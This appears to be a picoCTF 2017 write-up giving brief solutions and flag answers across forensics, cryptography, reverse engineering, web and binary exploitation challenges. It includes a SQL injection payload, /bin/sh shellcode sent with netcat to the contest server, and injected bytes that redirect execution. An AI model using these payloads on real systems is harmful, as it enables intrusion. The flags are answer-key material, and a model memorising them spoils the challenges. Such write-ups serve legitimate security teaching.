# Forensics

## Meta Find Me
Use som program to find meta data about the image and look for comments and GPS coordinates.

The flag is

`flag_2_meta_4_me_40_124_affa`

---

# Cryptography

## SoRandom
Just reverse the algorithm.

The flag is
`FLAG:3b1fa718577cd90efb2fdf5832b6a849`

---

## LeakedHashes
Take one of the hashes, do some Google fu, find the pre-image (no, hashes can *not* be decrypted or decoded...)

The flag is

`18e27fcac2c4b21329e0b118898794c0`

---

## Weird RSA
Using the Chinese Remainder theorem, we can compute the private key and decrypt the message. Then we convert the number into the corresponding ascii values.

The flag is

`Theres_more_than_one_way_to_RSA`

---

# Reverse Engineering

## A Thing Called the Stack
The return address lies right above the saved stack frame (ebp). Then, we have 4 push instructions that pushes 4 bytes each. Next we have the sub instruction that moves the stack pointer 0xf8 bytes further. In total, the distance between the esp and the return address is 264.

The flag is

`0x108`

---

## Programmers Assemble
To get out of the loop, eax must be zero. each round, ebx is incremented by 5 (the value of ecx). In the _fin_ function, we need ebx to be 0x8f2f. Thus, we must have run the loop for a fifth, i.e. 7331 number of times. We must load eax with this value, in hex.

The flag is

`0x1ca3`

---

# Web Exploitation

## My First SQL
Just a simple SQL injection a la

`' OR '1'='1`

The flag is

`be_careful_what_you_let_people_ask_1b3db77df6b116a38db8ceb7c81cb14c`

---

# Binary Exploitation

## Shellz
Find shellcode to run /bin/sh and inject. To keep netcat open, add a `cat -`.

`(python2 -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'; cat -) | nc shell2017.picoctf.com 12562`

Then, run `cat flag.txt`

The flag is

`f6f01bf0649b5aa5ec299bb51c8f8db4`

---

## Shells
We need to inject instructions to call the "win()" function. Radare2 tells us that the function
is located at address `0x08048540`.
An easy way is to just add the value to a register and call it:

```
mov eax, 0x08048540
call eax
```

Radare2 gives us the following:

```
rasm2 -a x86 -b 32 'mov eax, 0x08048540; call eax'
b840850408ffd0
```

Save the raw bytes to a file, then run

`cat input| nc shell2017.picoctf.com 58279`

The flag is

`84f1e856de605076057b0687dfd0865f`

---

## Guess The Number
So, this is about number representation. Radare2 shows that the "win()" function is 
located at address `0x0804852b`. The entered number is interpreted in base 10 and later divided
by 16. That means in order to get the address after division, we need to enter `2152223408`.
The problem is that `strtol()` returns a signed int. The range for this is `[-2**31, 2**31-1]`,
so the number entered will overflow. The solution is to enter the corresponding negative number,
which is

`-2**31 + 2152223408 - (2**31-1) = -2142743887`

The flag is

`d1ec8d4078eac1112548c1a6a00cfe07`

---
